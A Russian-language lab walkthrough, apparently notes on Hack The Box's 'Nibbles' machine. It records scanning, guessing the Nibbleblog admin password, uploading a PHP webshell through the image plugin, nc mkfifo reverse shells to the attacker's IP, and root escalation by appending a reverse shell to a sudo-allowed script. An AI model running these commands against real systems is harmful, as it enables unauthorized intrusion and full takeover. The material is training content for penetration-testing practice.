
Начало:
nmap -sV --open -oA nibbles\_initial\_scan 10.129.200.170 (-oA nibbles\_initial\_scan сохраняет результаты сканирования в файлы. "-oA" значит "output in All formats" — создаст три файл. nibbles\_initial\_scan - имя файла)
nmap -v -oG - 10.129.200.170 (выводит формат, допускающий grep, в стандартный вывод)
nmap -p- --open -oA nibbles\_full\_tcp\_scan 10.129.42.190 (проверим наличие служб)
nmap -sC -p 22,80 -oA nibbles\_script\_scan 10.129.42.190
nmap -sV --script=http-enum -oA nibbles\_nmap\_http\_enum 10.129.42.190


Получаем инфо:
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)

80/tcp open  http    Apache httpd <REDACTED> ((Ubuntu))

Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel

nc -nv 10.129.42.190 22 (22 (ssh) open SSH-2.0-OpenSSH\_7.2p2 Ubuntu-4ubuntu2.8)
nc -nv 10.129.42.190 80 ((UNKNOWN) \[10.129.42.190] 80 (http) open тут без баннера)


Попытка определить веб-приложение на хосте:
whatweb 10.129.42.190


Пробуем найти инфо на самой странице в браузере crtl+u или в консоли curl http://10.129.42.190


Находим <!-- /nibbleblog/ directory. Nothing interesting here! --> (директория с именем nibbleblog)


Проверяем:
whatweb http://10.129.42.190/nibbleblog (есть такая) 


Перечисляем доступные каталоги:
gobuster dir -u http://10.129.42.190/nibbleblog/ --wordlist /usr/share/seclists/Discovery/Web-Content/common.txt


Проверяем каталоги и получаем доступ к админ панели (Проверка стандартных паролей) 
подтверждаем версию nibblelog: 
====== Nibbleblog ======

Version: v4.0.3

Codename: Coffee

Release date: 2014-04-01




Подтверждаем имя пользователя Админ:
curl -s http://10.129.42.190/nibbleblog/content/private/users.xml | xmllint  --format -

**<?xml version="1.0" encoding="UTF-8" standalone="yes"?>**

**<users>**

  **<user username="admin">**



Проверка найденного конфиг файла:
curl -s http://10.129.42.190/nibbleblog/content/private/config.xml | xmllint --format -
Предполагаем что пароль от admin - nibbles


Входим в админ панель в поисках полезной информации
Находим вкладку с загрузкой плагинов и видим что можем использовать один из плагинов для загрузки файлов на сервер (my image)


Попытка использовать плагин для загрузки фрагмента PHP кода вместо изображения:



Код: php:

<?php system('id'); ?>





Сохраняем в файл и нажимаем browse чтобы хагрузить

получаем множество ошибок, но файл загрузился

Warning: imagesx() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 26



Warning: imagesy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 27



Warning: imagecreatetruecolor(): Invalid image dimensions in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 117



Warning: imagecopyresampled() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 118



Warning: imagejpeg() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 43



Warning: imagedestroy() expects parameter 1 to be resource, boolean given in /var/www/html/nibbleblog/admin/kernel/helpers/resize.class.php on line 80



нужно выяснить, куда был загружен файл (возвращаемся к перечислению 

каталогов и логически думаем куда? очевидно image

Все гуд





Дальше редактируем файл PHP для получения обратной оболочки и грузим повторно:

Базовый вид скрипт:



rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc <ATTACKING IP> <LISTENING PORT> >/tmp/f





В качестве заполнителя мы добавим tun0 IP-адрес нашего VPN <ATTACKING IP> и порт по нашему выбору, чтобы <LISTENING PORT> перехватывать обратную оболочку на нашем netcat слушателе. См. отредактированный PHP скрипт ниже:



Код: php:

<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 10.10.14.2 9443 >/tmp/f"); ?>



&nbsp;загружаем файл и запускаем netcat обработчик событий в терминале:

0xdf@htb\[/htb]$ nc -lvnp 9443



listening on \[any] 9443 ...



Firefoxhttp://nibbleblog/content/private/plugins/my\_image/image.php, чтобы запустить обратную оболочку (после загрузки php скрипта на серв)



Юзаем Python однострочную команду для запуска псевдотерминала, чтобы такие команды, как su и , sudo работали:



py2 

python -c 'import pty; pty.spawn("/bin/bash")'   (не удача, работает ток для p2)

&nbsp;

python3 -c 'import pty; pty.spawn("/bin/bash")'     (гуд, получили полноценную рабочую оболочку)


Находим скрипт "cat monitor.sh" читаем его (доступен для записи)



Грузим скрипт для чека файлов доступных с помощью sudo:

wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh

Запускаем локальный http сервер:
sudo python3 -m http.server 8080


Грузим на целевой объект скрипт через наш запущенный локальный сервер:
 wget http://10.10.14.2:8080/LinEnum.sh

Даем права на исполнение нашему скрипту(на нашем целевом):
chmod +x LinEnum.sh



Запускаем:
./LinEnum.sh

Зацепились за инфу(пользователь может запускать файл от root без пароля:
User nibbler may run the following commands on Nibbles:

&nbsp;   (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh



Дописываем в конец исполняемого файла скрипт для получения обратной оболочки:

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>\&1|nc 10.10.15.155 8443 >/tmp/f' | tee -a monitor.sh



Слушаем порт:

nc -lvnp 8443



Для простоты чекаем полный путь:

**sudo -l

Получаем:
(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh**


Запускаем файл:

sudo /home/nibbler/personal/stuff/monitor.sh





















